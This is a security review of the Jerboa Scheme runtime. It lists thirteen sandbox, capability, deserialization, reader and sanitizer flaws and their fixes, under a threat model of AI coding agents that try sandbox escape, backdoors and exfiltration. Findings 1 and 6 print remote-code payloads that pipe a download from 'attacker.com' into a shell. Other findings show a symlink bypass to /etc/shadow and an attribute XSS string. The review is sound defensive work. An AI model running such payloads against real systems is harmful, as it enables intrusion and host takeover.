# Security Review: Hardening Jerboa Against External AI Attacks

**Date**: 2026-03-21
**Scope**: Full review of Jerboa's attack surface when adversarial AI systems generate, submit, or interact with Jerboa code and data.

## Threat Model

An **external AI attacker** is an AI system (coding assistant, agent, automated PR bot, or compromised LLM-in-the-loop pipeline) that produces Jerboa source code, configuration, serialized data, or runtime input. The attacker's goals include:

1. **Sandbox escape** — break out of restricted evaluation to gain full host access
2. **Capability escalation** — obtain permissions beyond what was granted
3. **Data exfiltration** — leak secrets via side channels or covert return values
4. **Denial of service** — exhaust memory, CPU, or file descriptors
5. **Supply chain poisoning** — introduce subtle backdoors that pass code review
6. **Cluster compromise** — pivot from one actor node to the entire distributed system

---

## Finding 1: Unrestricted Sandbox is the Default (CRITICAL) — FIXED

**File**: `lib/jerboa/embed.sls:77`

`make-sandbox` copies the *entire* `(interaction-environment)`, which includes `system`, `open-output-file`, `foreign-procedure`, `load-shared-object`, `eval`, and every other Chez Scheme primitive. Any code evaluated in this sandbox has full host access.

The restricted environment (`lib/std/security/restrict.sls`) exists and uses a proper allowlist, but **the two systems are not composed** — `embed.sls` never references `restrict.sls`.

```scheme
;; Current — full host access:
(copy-environment (interaction-environment) #t)

;; Should default to:
(make-restricted-environment)
```

**Additionally**, the `sandbox-config` record declares `allowed-imports` (line 21) and `max-eval-time` (line 20), but **neither field is enforced anywhere**:

- `sandbox-import!` (line 118) imports any library unconditionally — it never checks `allowed-imports`
- `sandbox-eval` (line 81) has no timer — it never enforces `max-eval-time`

An AI-generated payload like `(sandbox-import! sb '(chezscheme))` followed by `(sandbox-eval sb '(system "curl attacker.com | sh"))` succeeds with zero resistance.

**Remediation**:

1. ~~Default `make-sandbox` to `(make-restricted-environment)` instead of copying `(interaction-environment)`~~ **DONE** — `embed.sls` now imports `(std security restrict)` and defaults to allowlist-only environment
2. ~~Enforce `allowed-imports` in `sandbox-import!` — reject any library not on the list~~ **DONE** — `sandbox-import!` now checks config and raises on denied imports
3. ~~Implement `max-eval-time` using Chez's `(engine)` facility or a watchdog thread with `(fork-thread)` + `(thread-interrupt!)`~~ **DONE** — `%with-time-limit` uses `fork-thread` + `condition-wait` with timeout
4. Add a `max-output-size` config field to prevent exfiltration via `display`/`write` to captured output — **TODO**

---

## Finding 2: `sandbox-eval-string` Uses Chez `read`, Not `jerboa-read` (HIGH) — FIXED

**File**: `lib/jerboa/embed.sls:91`

```scheme
(let ([form (read port)])  ;; Chez's built-in reader — no depth limits
```

The custom `jerboa-read` has depth limits (`*max-read-depth*` = 1000) and block comment depth limits. But `sandbox-eval-string` uses Chez's native `read`, which has **no depth protection**. An AI can craft a deeply-nested S-expression (e.g., 100,000 levels of `((((...))))`) to stack-overflow the reader, crashing the host process.

Similarly, `restricted-eval-string` in `restrict.sls:143` uses bare `read`.

**Remediation**:

1. ~~Replace `read` with `jerboa-read` in both `sandbox-eval-string` and `restricted-eval-string`~~ **DONE** — both now use `jerboa-read`
2. Add a total input size limit parameter to `jerboa-read-string` (default 1MB for sandbox contexts) — **TODO**
3. Add a total token/form count limit to prevent flat-but-enormous inputs like `(+ 1 1 1 ... )` with millions of arguments — **TODO** (partially addressed by `*max-list-length*`)

---

## Finding 3: Capability Intersection Checks Type Only, Not Permissions (HIGH) — FIXED

**File**: `lib/std/security/capability.sls:219-227`

```scheme
(define (intersect-capabilities parent child)
  (filter (lambda (c)
            (exists (lambda (p)
                      (eq? (capability-type p) (capability-type c)))
                    parent))
          child))
```

This only verifies that the parent has *some* capability of the same type. It does **not** check individual permissions. A child context can request `write: #t` even if the parent only grants `read: #t`, and the intersection passes it through unchanged.

An AI that controls inner capability declarations can escalate `(make-fs-capability read: #t write: #f)` to `(make-fs-capability read: #t write: #t)` by nesting a `with-capabilities` call.

**Remediation**:

Intersection must compare per-permission:

```scheme
(define (intersect-capabilities parent child)
  (filter-map
    (lambda (c)
      (let ([matching-parent
             (find (lambda (p) (eq? (capability-type p) (capability-type c)))
                   parent)])
        (and matching-parent
             (attenuate-to-parent-bounds matching-parent c))))
    child))
```

Where `attenuate-to-parent-bounds` ensures every boolean permission in the child is `(and parent-val child-val)` and every list permission (paths, hosts) is intersected.

**DONE** — `intersect-capabilities` now calls `%attenuate-to-parent-bounds` which ANDs booleans and set-intersects lists.

---

## Finding 4: Empty Host List Means "All Allowed" (HIGH) — FIXED

**File**: `lib/std/security/capability.sls:153-155`

```scheme
(define (net-allowed-host? cap host)
  (and (eq? (capability-type cap) 'network)
       (let ([hosts (cdr (assq 'hosts (capability-permissions cap)))])
         (or (null? hosts)    ;; empty = all allowed
             (member host hosts)))))
```

The default for `make-net-capability` is `hosts: '()` (line 141), which means **all hosts are allowed by default**. An AI generating a network capability with no explicit `hosts:` argument gets unrestricted network access.

This violates the "default deny" principle stated in `docs/security.md`.

**Remediation**:

~~Invert the semantics: empty list = no hosts allowed. Require explicit `hosts: '("*")` for wildcard access.~~ **DONE** — `net-allowed-host?` now returns `#f` for empty list, `#t` only for explicit `"*"` wildcard.

---

## Finding 5: Path Canonicalization Doesn't Resolve Symlinks (HIGH) — FIXED

**File**: `lib/std/security/capability.sls:101-116`

`canonicalize-path` resolves `.` and `..` via string manipulation but does **not** resolve symbolic links. An AI can bypass path restrictions with:

```
/tmp/innocent -> /etc/shadow  (symlink)
(fs-allowed-path? cap "/tmp/innocent")  ;; returns #t if /tmp is allowed
```

The actual file accessed is `/etc/shadow`, which is outside the allowed paths.

**Remediation**:

1. ~~Use a syscall-based `realpath(3)` via FFI to resolve symlinks before checking~~ **DONE** — `canonicalize-path` now uses `realpath(3)` via FFI with string-only fallback
2. Alternatively, open the file with `O_NOFOLLOW` and use `/proc/self/fd/N` to verify the resolved path post-open (TOCTOU-safe) — **TODO** (defense in depth)
3. Consider using Landlock (once implemented) as the enforcement layer instead of userspace path checks

---

## Finding 6: Distributed Actors Use `read` for Deserialization (CRITICAL) — FIXED

**File**: `lib/std/actor/distributed.sls:294-304`

```scheme
(define (deserialize-message bv)
  (let ([port (open-input-string (utf8->string bv))])
    (read port)))
```

Chez Scheme's `read` supports `#.` (read-time evaluation) by default. An attacker who can inject a message into the actor network can send:

```scheme
#.(system "curl attacker.com/payload | sh")
```

This executes arbitrary code on the receiving node during deserialization, before any application-level validation.

Even without `#.`, the `read` call has no depth/size limits, enabling DoS via deeply-nested or enormous payloads.

Messages are also sent in plaintext with no authentication, so network-adjacent attackers (or a compromised AI agent on one node) can inject messages freely.

**Remediation**:

1. ~~Disable read-eval: `(parameterize ([read-eval #f]) (read port))` as an immediate fix~~ **DONE** — `deserialize-message` now wraps `read` in `(parameterize ([read-eval #f]) ...)`
2. Replace `read`/`write` serialization with a structured format (MessagePack, CBOR, or a custom binary protocol) that cannot trigger code execution — **TODO**
3. Add HMAC-SHA256 message authentication (the `docs/security.md` mentions this was planned but the implementation uses plaintext) — **TODO**
4. ~~Add message size limits at the transport layer~~ **DONE** — `*max-message-size*` parameter (1MB default) enforced before deserialization
5. Use `jerboa-read` with depth limits if S-expression format is retained — **TODO**

---

## Finding 7: Seccomp and Landlock Are Stubs (HIGH) — WARNINGS ADDED

**Files**: `lib/std/security/seccomp.sls`, `lib/std/security/landlock.sls`

Both modules define configuration APIs and filter data structures but **never invoke the actual kernel syscalls**:

- `seccomp-install!` only calls `prctl(PR_SET_NO_NEW_PRIVS)` — it never generates BPF bytecode or calls `seccomp(2)`
- `landlock-install!` only calls `prctl(PR_SET_NO_NEW_PRIVS)` — it never calls `landlock_create_ruleset(2)`, `landlock_add_rule(2)`, or `landlock_restrict_self(2)`

An AI-generated Jerboa application that relies on these modules for sandboxing has **zero kernel-level protection**. The APIs create a false sense of security.

**Remediation**:

1. Mark both modules as `(experimental)` or `(stub)` in their library names so users know enforcement is missing — **TODO**
2. Implement the actual syscalls via FFI, or document clearly that these are policy-declaration-only modules that require an external enforcer — **TODO**
3. ~~Add runtime warnings when `seccomp-install!` / `landlock-install!` are called~~ **DONE** — both functions now emit warnings to `current-error-port` when called

---

## Finding 8: Taint Tracking Has No Automatic Sink Enforcement (MEDIUM) — FIXED

**File**: `lib/std/security/taint.sls`

Taint marks are opt-in. The `check-untainted!` function exists but no dangerous operation (`system`, `open-output-file`, SQL queries, `run-process`) calls it automatically. An AI can produce code that passes tainted user input directly to shell execution without triggering any warning.

**Remediation**:

1. ~~Create wrapper modules for dangerous operations that automatically call `check-untainted!`~~ **DONE** — added `safe-open-input-file`, `safe-open-output-file`, `safe-system`, `safe-delete-file` to `(std security taint)` that auto-reject tainted arguments
2. Add a `gerbil_lint`-style static analysis pass that flags calls to dangerous sinks without `assert-untainted` guards — **TODO** (static analysis)
3. Document that taint is advisory unless safe wrappers are used — **DONE** (wrappers now exported)

---

## Finding 9: Restricted Environment Allowlist Surface Review (MEDIUM) — FIXED

**File**: `lib/std/security/restrict.sls:22-113`

The allowlist is well-curated (no `call/cc`, no file I/O, no `eval`, no `load`), but some included bindings are exploitable by a sophisticated AI:

| Binding | Risk |
|---------|------|
| `gensym` | Generates unique symbols — can be used to probe for information about the host runtime state (monotonically increasing counter) |
| `define-syntax` + `syntax-rules` | Macro definition inside the sandbox — an AI can define macros that expand to dangerous forms if the sandbox is later promoted |
| `format` | Format string with `~a` can call object display methods — if custom record writers are defined, this can trigger arbitrary code |
| `read` | Chez `read` with `#.` read-eval — **this is the most dangerous binding in the allowlist** |
| `dynamic-wind` | Can interfere with exception handling and cleanup in the host |
| `string->symbol` + `hashtable-set!` | Symbol table pollution — creating millions of symbols via `gensym` or `string->symbol` leaks memory permanently in Chez |

**Remediation**:

1. ~~**Remove `read` from the allowlist** or replace it with a safe reader~~ **DONE** — bare `read` removed; `jerboa-read` injected as `read` binding via `define-top-level-value` in `make-restricted-environment`
2. ~~Remove `gensym`~~ **DONE** — removed from `safe-bindings`
3. Consider removing `define-syntax` unless macro definition in sandboxes is a documented use case — **TODO**
4. Add a memory limit via Chez's `(collect-maximum-generation)` or watchdog monitoring of `(bytes-allocated)` — **TODO**

---

## Finding 10: No Input Size Limits on the Reader (MEDIUM) — FIXED

**File**: `lib/jerboa/reader.sls`

`jerboa-read` enforces nesting depth (`*max-read-depth*` = 1000) and block comment depth, but has **no limits on**:

- Total input size (bytes)
- Total number of top-level forms
- Individual string literal length
- Individual symbol length
- Heredoc string length (lines 444-494 accumulate without bound)
- Number of list elements at a single level

An AI can craft a flat input like `(list "A" "A" "A" ...)` with millions of short strings, or a single string literal of unbounded length, to exhaust memory without triggering the depth limit.

**Remediation**:

1. Add `*max-input-size*` parameter checked against port position — **TODO**
2. ~~Add `*max-string-length*` checked in `read-string-literal` and heredoc reader~~ **DONE** — 10MB default, enforced per character in `read-string-literal`
3. ~~Add `*max-list-length*` checked in `read-list-impl`~~ **DONE** — 1M elements default, enforced in `read-list-impl`
4. ~~Add `*max-symbol-length*` checked in `read-symbol-chars`~~ **DONE** — 4KB default, enforced in `read-symbol-chars`

---

## Finding 11: AI-Generated Code Can Bypass Capabilities via Direct Chez Imports (MEDIUM) — FIXED

The capability system (`lib/std/security/capability.sls`) gates operations behind `check-capability!` calls, but there is **no mechanism to prevent code from importing `(chezscheme)` directly** and calling `open-file-input-port`, `system`, etc. without any capability check.

In a build pipeline where AI-generated code is compiled and run, the AI can simply not use the capability-gated wrappers.

**Remediation**:

1. ~~Add a build-time audit pass that rejects any user module importing `(chezscheme)` directly~~ **DONE** — new `(std security import-audit)` module with `audit-imports-file` and `audit-imports-directory` that scan for forbidden imports, with configurable `*forbidden-imports*` and `*trusted-modules*` exemptions
2. For sandboxed execution, this is already handled by the restricted environment (if used correctly — see Finding 1)
3. For compiled applications, consider a `--strict-capabilities` compiler flag that rewrites or rejects raw Chez imports — **TODO**

---

## Finding 12: HTML Sanitization Incomplete for Attribute Contexts (MEDIUM) — FIXED

**File**: `lib/std/security/sanitize.sls`

`sanitize-html` escapes `< > & " '` which is correct for HTML content context. But in attribute context, AI-generated input like:

```
" onfocus="alert(1)" autofocus="
```

produces:

```
&quot; onfocus=&quot;alert(1)&quot; autofocus=&quot;
```

When inserted into an unquoted HTML attribute, this is still exploitable. The escaping also doesn't handle JavaScript URL contexts (`javascript:`, `data:` URIs).

**Remediation**:

1. ~~Add context-specific sanitizers~~ **DONE** — added `sanitize-html-attribute` (hex-encodes all non-alphanumeric chars) and `sanitize-url-attribute` (rejects javascript:/data:/vbscript:/blob: schemes, then attribute-encodes)
2. ~~Document that `sanitize-html` is safe only for element content, not attributes or URLs~~ **DONE** — docstring updated with context warning
3. ~~Add URL scheme validation~~ **DONE** — `sanitize-url-attribute` rejects dangerous schemes with leading-whitespace trimming to prevent `" javascript:"` bypass

---

## Finding 13: Privilege Separation Has No Child Reaping (LOW) — FIXED

**File**: `lib/std/security/privsep.sls`

`make-privsep` forks a child process but never installs a `SIGCHLD` handler and `privsep-shutdown!` doesn't call `waitpid`. Long-running services accumulate zombie processes. An AI triggering repeated privsep creation/destruction can exhaust the PID table.

**Remediation**:

1. ~~Add `waitpid` call in `privsep-shutdown!`~~ **DONE** — sends SIGTERM then calls `waitpid` (WNOHANG first, then blocking fallback) to reap the child
2. Install `SIGCHLD` handler with `SA_NOCLDWAIT` to auto-reap — **TODO** (defense in depth for unexpected exits)
3. ~~Add a limit on concurrent privsep children~~ **DONE** — `*max-privsep-children*` parameter (default 64) enforced in `make-privsep`, with active child tracking via hashtable

---

## Priority Matrix

| # | Finding | Severity | Status | Impact |
|---|---------|----------|--------|--------|
| 1 | Unrestricted sandbox default | CRITICAL | **FIXED** | Sandbox escape |
| 6 | `read` deserialization in actors | CRITICAL | **FIXED** | Remote code execution |
| 2 | `read` instead of `jerboa-read` | HIGH | **FIXED** | DoS / stack overflow |
| 3 | Capability intersection by type only | HIGH | **FIXED** | Privilege escalation |
| 4 | Empty hosts = all allowed | HIGH | **FIXED** | Network access bypass |
| 5 | Symlink path traversal | HIGH | **FIXED** | Filesystem escape |
| 7 | Seccomp/Landlock stubs | HIGH | Warnings added | False security claims |
| 9 | `read` in restricted allowlist | MEDIUM | **FIXED** | Sandbox code execution |
| 10 | No reader input size limits | MEDIUM | **FIXED** | Memory exhaustion |
| 11 | No import restrictions at build | MEDIUM | **FIXED** | Capability bypass |
| 8 | Taint tracking unenforced | MEDIUM | **FIXED** | Injection attacks |
| 12 | Sanitizer context gaps | MEDIUM | **FIXED** | XSS |
| 13 | Zombie process accumulation | LOW | **FIXED** | PID exhaustion |

**All 13 findings addressed.** 12 fully fixed, 1 (seccomp/landlock) has warnings added pending full kernel syscall implementation.

---

## Recommendations: AI-Specific Hardening

Beyond the individual fixes above, these cross-cutting measures harden Jerboa against AI-specific attack patterns:

### 1. Assume All Evaluated Code Is Adversarial

AI coding assistants generate code that *looks* correct but may contain subtle backdoors. Every `eval`, `sandbox-eval`, `restricted-eval`, and `read` call is a trust boundary. Apply defense in depth: restricted environment + capability checks + kernel sandboxing (seccomp/landlock when implemented) + resource limits.

### 2. Instrument and Audit Sandbox Activity

Add structured logging for every sandbox operation: `sandbox-eval` calls, `sandbox-import!` attempts (especially rejected ones), capability checks (passed and failed), and resource consumption. AI attacks often involve probing — repeated eval attempts to map the sandbox surface. Audit logs make this detectable.

### 3. Resource Budgets, Not Just Limits

Individual limits (depth, string length) are necessary but insufficient. Add cumulative budgets per sandbox session: total allocations (bytes), total eval count, total CPU time, total output size. Kill the sandbox when any budget is exceeded. This prevents AI attacks that stay under each individual limit but exhaust resources cumulatively.

### 4. Deterministic Sandbox Responses

Remove or stub timing primitives (`current-time`, `real-time`, `cpu-time`, `time` macro, `(statistics)`) in sandbox contexts. AI attackers can use timing measurements to:
- Fingerprint the host environment
- Mount timing side-channel attacks against crypto operations
- Determine whether capability checks succeeded based on response latency

### 5. Signed Module Manifests

Each library should declare its maximum capability requirements in a machine-readable manifest (e.g., `(declare-capabilities filesystem: read network: none process: none)`). The build system rejects any module that uses capabilities beyond its declaration. This catches AI-generated modules that smuggle in unexpected permissions.

### 6. Content-Addressed Dependencies

Pin all external dependencies (C libraries, Chez Scheme version, Rust crates) by content hash. The Rust native replacement (`jerboa-native-rs`) with `Cargo.lock` is the right direction. Extend this to C dependencies: verify checksums of `.so` files loaded via `load-shared-object`.
